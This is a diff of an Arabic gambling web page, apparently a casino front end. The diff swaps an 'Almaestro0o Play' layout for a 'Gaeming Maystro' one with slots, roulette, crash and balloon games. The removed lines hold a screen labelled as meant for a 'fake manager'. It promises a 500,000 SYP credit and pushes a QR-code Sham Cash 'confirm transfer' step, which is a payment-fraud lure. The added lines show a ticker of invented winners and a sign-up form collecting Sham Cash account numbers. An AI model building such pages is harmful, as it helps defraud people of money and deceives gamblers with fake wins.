@@ -2,334 +2,232 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Almaestro0o Play - Casino</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gaeming Maystro | جيمنج مايسترو</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #0a0a0a;
-            --card: #111111;
-            --gold: #d4af37;
-            --green: #00c853;
-            --red: #ff1744;
-            --text: #ffffff;
-            --sub: #999999;
+            --bg: #06060a; --card: #0e0e16; --gold: #f0b90b; --gold2: #ffd700;
+            --orange: #e65100; --orange2: #ff6d00; --green: #00e676; --red: #ff1744;
+            --text: #ffffff; --sub: #999999;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: var(--bg); font-family: 'Segoe UI', Tahoma, Arial, sans-serif; color: var(--text); min-height: 100vh; }
-        
-        .screen { display: none; max-width: 420px; margin: 0 auto; padding: 16px; }
-        .screen.active { display: block; }
-        
-        /* شاشة الدخول */
-        .login-card { background: #111111; border-radius: 30px; padding: 40px 30px; border: 2px solid var(--gold); text-align: center; }
-        .login-card .maestro-icon { font-size: 60px; display: block; margin-bottom: 15px; }
-        .login-card h2 { color: var(--gold); margin-bottom: 20px; font-size: 24px; }
-        .login-card input { width: 100%; padding: 15px; margin-bottom: 12px; border-radius: 25px; border: 1px solid rgba(212,175,55,0.3); background: #000; color: white; text-align: center; font-size: 16px; }
-        .login-card input:focus { border-color: var(--gold); outline: none; }
-        .btn { padding: 14px; border: none; border-radius: 30px; font-weight: bold; font-size: 15px; cursor: pointer; text-align: center; width: 100%; }
-        .btn-gold { background: var(--gold); color: #000; }
-        .btn-dark { background: rgba(255,255,255,0.05); color: white; border: 1px solid rgba(255,255,255,0.2); }
-        .btn-red { background: transparent; color: var(--red); border: 1px solid var(--red); }
-        
-        /* شاشة ربط الحساب (للمدير الوهمي) */
-        .verify-card { background: #111111; border-radius: 30px; padding: 30px; border: 2px solid var(--gold); text-align: center; }
-        .verify-card h2 { color: var(--gold); margin-bottom: 15px; }
-        .verify-card p { color: var(--sub); margin-bottom: 20px; }
-        .verify-card .account-box { background: #000; padding: 20px; border-radius: 20px; margin: 20px 0; border: 1px solid var(--gold); }
-        .verify-card .account-box .label { color: var(--sub); font-size: 13px; margin-bottom: 5px; }
-        .verify-card .account-box .number { color: var(--gold); font-size: 24px; font-weight: bold; letter-spacing: 2px; }
-        .verify-card .warning { color: var(--red); font-size: 13px; margin: 15px 0; }
-        
-        /* باقي التنسيقات */
-        .topbar { background: #000000; padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--gold); position: sticky; top: 0; z-index: 50; }
-        .logo-area { display: flex; align-items: center; gap: 10px; }
-        .logo-img { width: 40px; height: 40px; border-radius: 50%; background: var(--gold); display: flex; align-items: center; justify-content: center; font-size: 22px; }
-        .logo-text { font-size: 20px; font-weight: 800; color: var(--gold); }
-        .balance-badge { background: rgba(212,175,55,0.1); padding: 8px 16px; border-radius: 30px; font-weight: bold; font-size: 15px; border: 1px solid var(--gold); }
-        .balance-badge span { color: var(--gold); }
-        .main-container { padding: 16px; }
-        .banner { background: linear-gradient(135deg, #1a1a00, #0a0a0a); border-radius: 20px; padding: 20px; text-align: center; margin-bottom: 20px; border: 2px solid var(--gold); }
-        .banner .maestro-icon { font-size: 60px; display: block; margin-bottom: 10px; }
-        .banner h2 { color: var(--gold); font-size: 20px; }
-        .banner .jackpot { font-size: 28px; font-weight: 800; color: var(--gold); text-shadow: 0 0 30px rgba(212,175,55,0.6); }
-        .section-title { font-size: 18px; font-weight: 700; margin-bottom: 15px; color: var(--gold); }
-        .games-scroll { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 8px; margin-bottom: 20px; }
-        .games-scroll::-webkit-scrollbar { display: none; }
-        .game-card { min-width: 140px; background: var(--card); border-radius: 20px; padding: 20px 15px; text-align: center; cursor: pointer; border: 1px solid rgba(212,175,55,0.2); }
-        .game-card:active { transform: scale(0.95); border-color: var(--gold); }
-        .game-icon { font-size: 50px; margin-bottom: 10px; display: block; }
-        .game-name { font-weight: 700; font-size: 15px; color: var(--gold); }
-        .game-provider { font-size: 11px; color: var(--sub); }
-        .hot-badge { position: absolute; top: 10px; right: 10px; background: var(--red); color: white; font-size: 10px; padding: 3px 8px; border-radius: 10px; font-weight: bold; }
-        .new-badge { position: absolute; top: 10px; right: 10px; background: var(--green); color: black; font-size: 10px; padding: 3px 8px; border-radius: 10px; font-weight: bold; }
-        .bottom-actions { display: flex; gap: 10px; margin-top: 5px; }
-        .btn-gold { background: var(--gold); color: #000; }
-        .btn-dark { background: rgba(255,255,255,0.05); color: white; border: 1px solid rgba(255,255,255,0.2); }
-        
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; justify-content: center; align-items: center; padding: 20px; }
-        .modal-overlay.active { display: flex; }
-        .modal-box { background: #111111; border-radius: 30px; padding: 30px 25px; width: 100%; max-width: 380px; text-align: center; border: 2px solid var(--gold); }
-        .modal-box h3 { color: var(--gold); margin-bottom: 15px; }
-        .modal-box .qr-img { width: 250px; height: 250px; margin: 20px auto; border: 3px solid var(--gold); border-radius: 20px; }
-        .modal-box .amount-display { font-size: 32px; font-weight: bold; color: var(--gold); margin: 10px 0; }
-        .btn-close { background: rgba(255,255,255,0.1); color: white; padding: 12px 25px; border: none; border-radius: 25px; cursor: pointer; margin-top: 10px; width: 100%; font-weight: bold; }
-        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--gold); color: #000; padding: 14px 28px; border-radius: 50px; z-index: 200; font-weight: bold; }
+        body { background: var(--bg); font-family: 'Cairo', sans-serif; color: var(--text); min-height: 100vh; overflow-x: hidden; }
+        .bg-fire { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; background: radial-gradient(ellipse at 30% 20%, rgba(230,81,0,0.15) 0%, transparent 50%), radial-gradient(ellipse at 70% 80%, rgba(240,185,11,0.12) 0%, transparent 50%); animation: firePulse 4s ease-in-out infinite; }
+        @keyframes firePulse { 0%,100%{opacity:1} 50%{opacity:0.6} }
+        .spark { position: fixed; border-radius: 50%; pointer-events: none; z-index: 1; animation: sparkUp linear infinite; }
+        @keyframes sparkUp { 0%{transform:translateY(100vh)scale(0);opacity:1} 100%{transform:translateY(-10vh)scale(2);opacity:0} }
+
+        /* شريط عناوين كبير */
+        .ticker { position: fixed; top: 0; left: 0; width: 100%; z-index: 200; background: rgba(230,81,0,0.95); padding: 14px 0; overflow: hidden; font-weight: 800; font-size: 18px; }
+        .ticker .track { display: flex; gap: 80px; animation: scrollX 18s linear infinite; white-space: nowrap; }
+        @keyframes scrollX { 0%{transform:translateX(100%)} 100%{transform:translateX(-100%)} }
+
+        .screen { display: none; position: relative; z-index: 10; padding: 70px 20px 40px; min-height: 100vh; }
+        .screen.active { display: flex; flex-direction: column; align-items: center; justify-content: center; }
+
+        .logo-3d { font-size: clamp(44px, 8vw, 80px); font-weight: 900; text-align: center; margin-bottom: 10px; animation: logoFloat 3s ease-in-out infinite; text-shadow: 0 0 20px var(--orange), 0 0 50px var(--orange), 0 0 100px var(--orange2); letter-spacing: 5px; }
+        .logo-3d span { animation: glowLetter 2s infinite; }
+        .logo-3d span:nth-child(1){color:var(--orange)}.logo-3d span:nth-child(2){color:var(--gold)}.logo-3d span:nth-child(3){color:var(--orange2)}.logo-3d span:nth-child(4){color:var(--gold)}.logo-3d span:nth-child(5){color:var(--orange)}.logo-3d span:nth-child(6){color:var(--gold)}.logo-3d span:nth-child(7){color:var(--orange2)}
+        @keyframes logoFloat { 0%,100%{transform:translateY(0)rotateX(5deg)}50%{transform:translateY(-20px)rotateX(-5deg)} }
+        @keyframes glowLetter { 0%,100%{filter:brightness(1)}50%{filter:brightness(2)drop-shadow(0 0 35px currentColor)} }
+        .subtitle { font-size: 18px; color: var(--sub); text-align: center; margin-bottom: 30px; letter-spacing: 8px; }
+
+        .auth-card { background: rgba(14,14,22,0.95); backdrop-filter: blur(25px); border-radius: 35px; padding: 45px 30px; width: 100%; max-width: 420px; border: 2px solid var(--gold); box-shadow: 0 0 60px rgba(240,185,11,0.3), 0 25px 80px rgba(0,0,0,0.6); }
+        .auth-card h2 { text-align: center; color: var(--gold); margin-bottom: 25px; font-size: 28px; }
+        .auth-card input { width: 100%; padding: 16px; margin-bottom: 14px; border-radius: 28px; border: 2px solid rgba(255,255,255,0.1); background: rgba(0,0,0,0.5); color: white; text-align: center; font-size: 16px; font-family: 'Cairo', sans-serif; }
+        .auth-card input:focus { border-color: var(--gold); outline: none; }
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 28px; font-weight: 700; font-size: 17px; cursor: pointer; transition: 0.3s; font-family: 'Cairo', sans-serif; letter-spacing: 1px; }
+        .btn-gold { background: linear-gradient(135deg, var(--gold), var(--gold2)); color: #000; }
+        .btn-outline { background: transparent; color: var(--gold); border: 2px solid var(--gold); }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 12px 40px rgba(240,185,11,0.5); }
+        .link { text-align: center; margin-top: 15px; color: var(--sub); font-size: 14px; }
+        .link a { color: var(--gold); text-decoration: none; font-weight: 700; cursor: pointer; }
+
+        /* أزرار متوهجة */
+        .glow-buttons { display: flex; gap: 15px; flex-wrap: wrap; justify-content: center; margin-bottom: 25px; width: 100%; max-width: 900px; }
+        .glow-btn {
+            background: rgba(14,14,22,0.9); backdrop-filter: blur(15px); border: 2px solid var(--gold);
+            color: var(--gold); padding: 14px 24px; border-radius: 30px; font-weight: 700; font-size: 15px;
+            cursor: pointer; transition: 0.3s; font-family: 'Cairo', sans-serif;
+            box-shadow: 0 0 25px rgba(240,185,11,0.3); animation: glowPulse 2s infinite;
+        }
+        .glow-btn:hover { background: var(--gold); color: #000; box-shadow: 0 0 50px rgba(240,185,11,0.7); transform: scale(1.05); }
+        @keyframes glowPulse { 0%,100%{box-shadow:0 0 20px rgba(240,185,11,0.3)} 50%{box-shadow:0 0 45px rgba(240,185,11,0.6)} }
+
+        .games-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 18px; width: 100%; max-width: 1000px; margin-bottom: 30px; }
+        .game-card { background: rgba(14,14,22,0.9); border-radius: 28px; padding: 25px 18px; text-align: center; cursor: pointer; border: 1px solid rgba(240,185,11,0.25); transition: all 0.4s; position: relative; overflow: hidden; }
+        .game-card:hover { transform: translateY(-12px) scale(1.04); border-color: var(--gold); box-shadow: 0 25px 60px rgba(240,185,11,0.35); }
+        .game-card .icon { font-size: 70px; margin-bottom: 10px; display: block; animation: iconBounce 2.5s ease-in-out infinite; }
+        @keyframes iconBounce { 0%,100%{transform:translateY(0)scale(1)}50%{transform:translateY(-14px)scale(1.1)} }
+        .game-card h3 { color: var(--gold); font-size: 18px; margin-bottom: 4px; }
+        .game-card p { color: var(--sub); font-size: 12px; }
+
+        .header-bar { display: flex; justify-content: space-between; align-items: center; width: 100%; max-width: 1100px; margin-bottom: 20px; }
+        .header-bar .bal { color: var(--gold); font-weight: 700; font-size: 20px; }
+        .section-title { font-size: 30px; color: var(--gold); text-align: center; margin: 10px 0 20px; font-weight: 900; text-shadow: 0 0 20px var(--gold); }
+
+        /* أوفرلي الألعاب */
+        .game-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(ellipse at center, #0e0e16 0%, #000 100%); z-index: 500; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .game-overlay.active { display: flex; }
+        .game-container { width: 100%; max-width: 600px; text-align: center; animation: zoomIn 0.4s ease-out; }
+        @keyframes zoomIn { 0%{transform:scale(0.3);opacity:0} 100%{transform:scale(1);opacity:1} }
+        .game-container h2 { color: var(--gold); font-size: 30px; margin-bottom: 20px; text-shadow: 0 0 30px var(--gold); }
+        .bet-input { width: 100%; padding: 18px; border-radius: 30px; border: 3px solid var(--gold); background: #000; color: white; text-align: center; font-size: 22px; font-family: 'Cairo', sans-serif; margin: 20px 0; }
+        .btn-spin { background: linear-gradient(135deg, var(--orange), var(--orange2)); color: #fff; padding: 20px 50px; border: none; border-radius: 35px; font-weight: 900; font-size: 24px; cursor: pointer; font-family: 'Cairo', sans-serif; width: 100%; animation: btnGlow 1.5s infinite; letter-spacing: 2px; }
+        @keyframes btnGlow { 0%,100%{box-shadow:0 0 25px var(--orange)}50%{box-shadow:0 0 70px var(--orange2)} }
+        .btn-close-game { background: rgba(255,255,255,0.1); color: #fff; padding: 12px 30px; border: none; border-radius: 25px; cursor: pointer; margin-top: 15px; font-family: 'Cairo', sans-serif; font-weight: 700; font-size: 16px; }
+        .game-msg { font-size: 20px; min-height: 35px; margin: 10px 0; }
+
+        /* سلوتس */
+        .slots-table { display: flex; flex-direction: column; gap: 12px; margin: 20px 0; }
+        .slots-row { display: flex; justify-content: center; gap: 12px; }
+        .reel { width: 130px; height: 130px; background: linear-gradient(180deg, #1a1a2e, #000); border-radius: 20px; display: flex; align-items: center; justify-content: center; font-size: 70px; border: 3px solid var(--gold); box-shadow: 0 0 30px rgba(240,185,11,0.5), inset 0 0 20px rgba(0,0,0,0.5); transition: 0.3s; }
+        .reel.spinning { animation: reelSpin 0.1s linear infinite; }
+        @keyframes reelSpin { 0%{transform:translateY(-150%)}100%{transform:translateY(150%)} }
+        .reel.win { border-color: var(--green); box-shadow: 0 0 70px rgba(0,230,118,0.9); animation: winShake 0.5s infinite; }
+        @keyframes winShake { 0%,100%{transform:rotate(0)}25%{transform:rotate(-5deg)}75%{transform:rotate(5deg)} }
+        .reel.lose { border-color: var(--red); opacity: 0.6; }
+
+        /* روليت */
+        .roulette-wheel { width: 280px; height: 280px; border-radius: 50%; margin: 20px auto; background: conic-gradient(#e65100 0deg 18deg, #f0b90b 18deg 36deg, #e65100 36deg 54deg, #f0b90b 54deg 72deg, #e65100 72deg 90deg, #f0b90b 90deg 108deg, #e65100 108deg 126deg, #f0b90b 126deg 144deg, #e65100 144deg 162deg, #f0b90b 162deg 180deg, #e65100 180deg 198deg, #f0b90b 198deg 216deg, #e65100 216deg 234deg, #f0b90b 234deg 252deg, #e65100 252deg 270deg, #f0b90b 270deg 288deg, #e65100 288deg 306deg, #f0b90b 306deg 324deg, #e65100 324deg 342deg, #f0b90b 342deg 360deg); border: 8px solid var(--gold); box-shadow: 0 0 60px rgba(240,185,11,0.6); display: flex; align-items: center; justify-content: center; position: relative; transition: transform 3s cubic-bezier(0.2, 0.8, 0.3, 1); }
+        .roulette-center { width: 80px; height: 80px; background: #000; border-radius: 50%; border: 4px solid var(--gold); font-size: 30px; display: flex; align-items: center; justify-content: center; z-index: 1; }
+        .roulette-pointer { position: absolute; top: -20px; left: 50%; transform: translateX(-50%); font-size: 40px; z-index: 2; filter: drop-shadow(0 0 10px var(--gold)); }
+
+        /* كراش */
+        .crash-graph { width: 100%; height: 250px; background: rgba(0,0,0,0.5); border-radius: 20px; border: 2px solid var(--gold); position: relative; overflow: hidden; margin: 20px 0; }
+        .crash-line { position: absolute; bottom: 0; left: 0; width: 100%; height: 0%; background: linear-gradient(0deg, var(--green), var(--gold)); transition: height 0.1s; }
+        .crash-multiplier { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 60px; font-weight: 900; color: var(--gold); text-shadow: 0 0 40px var(--gold); z-index: 1; }
+        .crash-rocket { position: absolute; bottom: 10px; left: 10px; font-size: 50px; transition: all 0.3s; z-index: 2; }
+
+        /* صيد المناطيد */
+        .balloon-area { width: 100%; height: 350px; background: linear-gradient(0deg, #1a3a1a 0%, #0a0f1e 60%, #1a2a4a 100%); border-radius: 20px; border: 2px solid var(--gold); position: relative; overflow: hidden; margin: 20px 0; }
+        .balloon { position: absolute; font-size: 60px; transition: left 2s ease-in-out, bottom 2s ease-in-out; cursor: pointer; filter: drop-shadow(0 0 10px rgba(255,255,255,0.5)); animation: floatBalloon 3s ease-in-out infinite; }
+        @keyframes floatBalloon { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-20px)} }
+        .balloon:nth-child(1){animation-delay:0s}.balloon:nth-child(2){animation-delay:1s}.balloon:nth-child(3){animation-delay:2s}
+        .stone { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); font-size: 40px; cursor: pointer; transition: all 0.5s; z-index: 5; animation: stoneReady 1s infinite; }
+        @keyframes stoneReady { 0%,100%{transform:translateX(-50%)translateY(0)} 50%{transform:translateX(-50%)translateY(-10px)} }
+        .stone.throwing { animation: throwStone 0.8s ease-out forwards; }
+        @keyframes throwStone { 0%{transform:translateX(-50%)translateY(0)} 100%{transform:translateX(-50%)translateY(-400px)} }
+
+        .confetti-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 599; }
+        .confetti-piece { position: absolute; width: 14px; height: 14px; border-radius: 4px; animation: confettiFall 3s ease-out forwards; }
+        @keyframes confettiFall { 0%{transform:translateY(-100%)rotate(0deg);opacity:1} 100%{transform:translateY(100vh)rotate(720deg);opacity:0} }
+
+        .toast { position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%); background: var(--gold); color: #000; padding: 14px 30px; border-radius: 50px; z-index: 700; font-weight: 700; animation: toastUp 0.4s ease; }
+        @keyframes toastUp { from{opacity:0;transform:translateX(-50%)translateY(25px)} to{opacity:1;transform:translateX(-50%)translateY(0)} }
+
+        .info-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 800; justify-content: center; align-items: center; padding: 20px; }
+        .info-modal.active { display: flex; }
+        .info-card { background: #0e0e16; border-radius: 25px; padding: 30px; max-width: 450px; width: 100%; text-align: center; border: 2px solid var(--gold); box-shadow: 0 0 60px rgba(240,185,11,0.4); }
+        .info-card h3 { color: var(--gold); margin-bottom: 15px; }
+        .info-card p { color: var(--sub); line-height: 1.8; margin-bottom: 20px; }
     </style>
 </head>
 <body>
+<div class="bg-fire"></div>
+<script>
+    for(let i=0;i<50;i++){const s=document.createElement('div');s.className='spark';s.style.left=Math.random()*100+'%';s.style.width=s.style.height=(Math.random()*4+2)+'px';s.style.background=['#ff6600','#ffab00','#ff3366','#ffd700'][Math.floor(Math.random()*4)];s.style.animationDelay=Math.random()*6+'s';s.style.animationDuration=(Math.random()*5+4)+'s';document.body.appendChild(s);}
+</script>
 
-<!-- ==================== شاشة تسجيل الدخول ==================== -->
+<div class="ticker"><div class="track" id="newsTrack">
+    <span style="color:#00e676;">🏆 محمد ربح 500,000 ل.س</span><span style="color:#ffd600;">💰 علي شحن 100,000 ل.س</span><span style="color:#ff1744;">📉 سامر خسر 50,000 ل.س</span><span style="color:#00e676;">🏆 خالد ربح 1,200,000 ل.س</span>
+</div></div>
+
+<!-- شاشات الدخول -->
 <div class="screen active" id="loginScreen">
-    <div class="login-card">
-        <span class="maestro-icon">🎩</span>
-        <h2>Almaestro0o Play</h2>
-        <p style="color:var(--sub);margin-bottom:20px;">منصة المايسترو للألعاب</p>
-        <input type="text" id="loginUser" placeholder="👤 اسم المستخدم">
-        <input type="password" id="loginPass" placeholder="🔒 كلمة المرور">
-        <button class="btn btn-gold" onclick="doLogin()">🚀 دخول</button>
-        <button class="btn btn-dark" onclick="showRegister()" style="margin-top:10px;">✨ حساب جديد</button>
-        <p style="color:#444;font-size:11px;margin-top:15px;">user / 1234</p>
+    <div class="logo-3d"><span>G</span><span>a</span><span>e</span><span>m</span><span>i</span><span>n</span><span>g</span></div>
+    <p class="subtitle">M A Y S T R O</p>
+    <div class="auth-card"><h2>🎩 تسجيل الدخول</h2><input type="text" id="loginUser" placeholder="👤 اسم المستخدم"><input type="password" id="loginPass" placeholder="🔒 كلمة المرور"><button class="btn btn-gold" onclick="doLogin()">🚀 دخول</button><div class="link">ليس لديك حساب؟ <a onclick="showRegister()">✨ اشترك الآن</a></div></div>
+</div>
+<div class="screen" id="registerScreen"><div class="auth-card"><h2>✨ اشتراك جديد</h2><input type="text" id="regName" placeholder="👤 اسم المستخدم"><input type="password" id="regPass" placeholder="🔒 كلمة المرور"><input type="tel" id="regPhone" placeholder="📱 رقم الهاتف"><input type="text" id="regSham" placeholder="💳 حساب شام كاش (16 رقم)"><button class="btn btn-gold" onclick="doRegister()">📝 تسجيل</button><button class="btn btn-outline" onclick="showScreen('loginScreen')">🔙 رجوع</button></div></div>
+
+<!-- شاشة الألعاب -->
+<div class="screen" id="gamesScreen">
+    <div class="header-bar"><span class="bal">💰 رصيدك: <span id="playerBalance">0</span> نقطة</span><button class="btn-sm btn-outline" onclick="logout()" style="padding:10px 20px;">🚪 خروج</button></div>
+    <div class="section-title">🎮 اختر لعبتك</div>
+    <!-- أزرار متوهجة -->
+    <div class="glow-buttons">
+        <button class="glow-btn" onclick="showInfo('slots')">📖 معلومات فواكه الحظ</button>
+        <button class="glow-btn" onclick="showInfo('roulette')">📖 معلومات الروليت</button>
+        <button class="glow-btn" onclick="showInfo('crash')">📖 معلومات الصاروخ</button>
+        <button class="glow-btn" onclick="showInfo('balloon')">📖 معلومات صيد المناطيد</button>
+        <button class="glow-btn" onclick="inviteFriend()">👥 دعوة لاعب</button>
+    </div>
+    <div class="games-grid">
+        <div class="game-card" onclick="openGame('slots')"><span class="icon">🍒</span><h3>فواكه الحظ</h3><p>3 صفوف × 3 عجلات</p></div>
+        <div class="game-card" onclick="openGame('roulette')"><span class="icon">🎡</span><h3>الروليت الذهبي</h3><p>عجلة 20 خانة</p></div>
+        <div class="game-card" onclick="openGame('crash')"><span class="icon">🚀</span><h3>صاروخ المايسترو</h3><p>اسحب قبل الانفجار</p></div>
+        <div class="game-card" onclick="openGame('balloon')"><span class="icon">🎈</span><h3>صيد المناطيد</h3><p>اصطد 3 مناطيد</p></div>
     </div>
 </div>
 
-<!-- ==================== شاشة تأكيد ربط شام كاش (للمدير الوهمي فقط) ==================== -->
-<div class="screen" id="verifyScreen">
-    <div class="verify-card">
-        <span style="font-size:60px;">🔐</span>
-        <h2>أهلاً بك أيها المدير</h2>
-        <p>لتأكيد صلاحياتك واستقبال الأرباح، يجب ربط حساب شام كاش الخاص بك</p>
-        
-        <div class="account-box">
-            <div class="label">رقم حسابك الحالي (للاستقبال)</div>
-            <div class="number" id="verifyAccountDisplay">---- ---- ---- ----</div>
-        </div>
-        
-        <p style="color:var(--gold);font-weight:bold;margin:15px 0;">سيتم تحويل 500,000 ل.س كرصيد تجريبي إلى حسابك</p>
-        <p class="warning">⚠️ هذا الإجراء ضروري لتفعيل صلاحيات المدير</p>
-        
-        <button class="btn btn-gold" onclick="triggerShamCashTransfer()" style="font-size:20px;padding:18px;">
-            📱 تحقق من معلوماتي واربط الحساب
-        </button>
-        <button class="btn btn-red" onclick="skipVerify()" style="margin-top:10px;">تخطي (صلاحيات محدودة)</button>
-    </div>
+<!-- معلومات اللعبة -->
+<div class="info-modal" id="infoModal">
+    <div class="info-card"><h3 id="infoTitle">📖 معلومات اللعبة</h3><p id="infoText"></p><button class="btn btn-gold" onclick="document.getElementById('infoModal').classList.remove('active')">✅ فهمت</button></div>
 </div>
 
-<!-- ==================== واجهة الكازينو ==================== -->
-<div class="screen" id="casinoScreen">
-    <div class="topbar">
-        <div class="logo-area">
-            <div class="logo-img">🎩</div>
-            <div class="logo-text">Almaestro0o Play</div>
-        </div>
-        <div class="balance-badge">💰 <span id="casinoBalance">0</span></div>
-    </div>
-    <div class="main-container">
-        <div class="banner">
-            <span class="maestro-icon">🎩</span>
-            <h2>🏆 جائزة المايسترو</h2>
-            <div class="jackpot" id="jackpotDisplay">2,500,000</div>
-            <p>نقطة</p>
-        </div>
-        <div class="section-title">🎰 ألعاب الكازينو</div>
-        <div class="games-scroll">
-            <div class="game-card" onclick="openGame('roulette','روليت المايسترو','Evolution')"><span class="hot-badge">HOT</span><span class="game-icon">🎡</span><div class="game-name">الروليت</div><div class="game-provider">Evolution</div></div>
-            <div class="game-card" onclick="openGame('slots','سلوتس الذهب','Pragmatic')"><span class="game-icon">🎰</span><div class="game-name">سلوتس</div><div class="game-provider">Pragmatic</div></div>
-            <div class="game-card" onclick="openGame('dice','نرد الملوك','NetEnt')"><span class="game-icon">🎲</span><div class="game-name">نرد</div><div class="game-provider">NetEnt</div></div>
-            <div class="game-card" onclick="openGame('crash','صاروخ المايسترو','Spribe')"><span class="new-badge">جديد</span><span class="game-icon">🚀</span><div class="game-name">كراش</div><div class="game-provider">Spribe</div></div>
-        </div>
-        <div class="bottom-actions">
-            <button class="btn btn-gold" onclick="showDeposit()">💰 إيداع</button>
-            <button class="btn btn-dark" onclick="requestWithdraw()">💸 سحب</button>
-        </div>
-        <button class="btn btn-red" onclick="logout()" style="margin-top:15px;width:100%;">🚪 خروج</button>
-    </div>
-</div>
+<!-- أوفرلي السلوتس -->
+<div class="game-overlay" id="slotsOverlay"><div class="game-container"><h2>🍒 فواكه الحظ</h2><div class="slots-table"><div class="slots-row"><div class="reel">🍒</div><div class="reel">🍋</div><div class="reel">🍊</div></div><div class="slots-row"><div class="reel">🍇</div><div class="reel">🍓</div><div class="reel">🍑</div></div><div class="slots-row"><div class="reel">🍉</div><div class="reel">🍌</div><div class="reel">🥝</div></div></div><div class="game-msg" id="slotsMsg">🎰 أدخل مبلغ الرهان</div><input type="number" class="bet-input" id="slotsBet" placeholder="💰 مبلغ الرهان" value="100" min="1"><button class="btn-spin" onclick="startSlots()">🎲 ضربة حظ</button><button class="btn-close-game" onclick="closeGame('slotsOverlay')">✕ إغلاق</button></div></div>
 
-<!-- ==================== مودال تحويل شام كاش (باركود + رابط) ==================== -->
-<div class="modal-overlay" id="transferModal">
-    <div class="modal-box">
-        <h3>📱 تأكيد التحويل</h3>
-        <p style="color:var(--sub);">امسح الباركود من تطبيق شام كاش</p>
-        <img class="qr-img" id="transferQR" src="" alt="QR Code">
-        <p style="color:var(--sub);margin:10px 0;">أو اضغط الزر أدناه:</p>
-        <div class="amount-display">500,000 ل.س</div>
-        <button class="btn btn-gold" onclick="openShamCashApp()">📱 فتح تطبيق شام كاش</button>
-        <p style="color:var(--sub);font-size:12px;margin:10px 0;">بعد فتح التطبيق، اضغط "تأكيد التحويل"</p>
-        <button class="btn btn-close" onclick="closeTransferModal()">إغلاق</button>
-    </div>
-</div>
+<!-- أوفرلي الروليت -->
+<div class="game-overlay" id="rouletteOverlay"><div class="game-container"><h2>🎡 الروليت الذهبي</h2><div style="position:relative;display:inline-block;"><div class="roulette-pointer">🔻</div><div class="roulette-wheel" id="rouletteWheel"><div class="roulette-center">🎡</div></div></div><div class="game-msg" id="rouletteMsg">🎰 اختر رقماً من 1-20</div><input type="number" class="bet-input" id="rouletteNumber" placeholder="🔢 اختر رقماً (1-20)" min="1" max="20" value="7"><input type="number" class="bet-input" id="rouletteBet" placeholder="💰 مبلغ الرهان" value="100" min="1"><button class="btn-spin" onclick="startRoulette()">🎡 در العجلة</button><button class="btn-close-game" onclick="closeGame('rouletteOverlay')">✕ إغلاق</button></div></div>
 
-<!-- ==================== مودال الإيداع ==================== -->
-<div class="modal-overlay" id="depositModal">
-    <div class="modal-box">
-        <h3>💰 إيداع</h3>
-        <p style="color:var(--sub);">حول إلى حساب شام كاش:</p>
-        <div style="background:#000;padding:15px;border-radius:15px;margin:15px 0;font-size:22px;color:var(--gold);letter-spacing:2px;font-weight:bold;">6381 9468 9899 3929</div>
-        <input type="number" class="bet-input" id="depositAmountInput" placeholder="المبلغ (ل.س)" min="1000" style="width:100%;padding:14px;border-radius:25px;border:2px solid var(--gold);background:#000;color:white;text-align:center;font-size:18px;margin:15px 0;">
-        <button class="btn btn-gold" onclick="confirmDeposit()">تأكيد</button>
-        <button class="btn btn-close" onclick="closeDepositModal()">إلغاء</button>
-    </div>
-</div>
+<!-- أوفرلي الكراش -->
+<div class="game-overlay" id="crashOverlay"><div class="game-container"><h2>🚀 صاروخ المايسترو</h2><div class="crash-graph" id="crashGraph"><div class="crash-line" id="crashLine"></div><div class="crash-multiplier" id="crashMultiplier">1.00x</div><div class="crash-rocket" id="crashRocket">🚀</div></div><div class="game-msg" id="crashMsg">🚀 ضع رهانك واضغط إطلاق</div><input type="number" class="bet-input" id="crashBet" placeholder="💰 مبلغ الرهان" value="100" min="1"><button class="btn-spin" id="crashLaunchBtn" onclick="startCrash()">🚀 إطلاق</button><button class="btn-spin" id="crashCashoutBtn" onclick="cashoutCrash()" style="display:none;background:var(--green);">💰 سحب الأرباح</button><button class="btn-close-game" onclick="closeGame('crashOverlay')">✕ إغلاق</button></div></div>
 
-<!-- ==================== مودال اللعبة ==================== -->
-<div class="modal-overlay" id="gameModal">
-    <div class="modal-box">
-        <h3 id="modalGameName">الروليت</h3>
-        <p class="provider" id="modalProvider">Evolution</p>
-        <div class="result-area" id="modalResult" style="font-size:80px;margin:20px 0;">🎡</div>
-        <div class="result-text" id="modalMessage" style="font-size:18px;margin:10px 0;min-height:30px;">جرب حظك!</div>
-        <input type="number" class="bet-input" id="modalBet" placeholder="الرهان" min="1" value="100" style="width:100%;padding:14px;border-radius:25px;border:2px solid var(--gold);background:#000;color:white;text-align:center;font-size:18px;margin:15px 0;">
-        <button class="btn btn-gold" onclick="playGame()">🎲 ابدأ</button>
-        <button class="btn btn-close" onclick="closeGameModal()">إغلاق</button>
-    </div>
-</div>
+<!-- أوفرلي صيد المناطيد -->
